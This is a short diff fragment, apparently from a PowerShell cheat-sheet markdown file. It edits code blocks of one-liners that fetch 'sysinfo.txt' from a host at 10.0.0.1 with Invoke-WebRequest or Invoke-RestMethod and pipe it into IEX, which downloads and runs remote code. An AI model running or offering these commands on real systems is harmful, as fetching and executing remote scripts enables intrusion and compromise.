@@ -21,6 +21,8 @@ Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | IEX
 ```
 ```ps
 Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt' | IEX
+```
+```ps
 IEX (Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt')
 ```
 ```ps
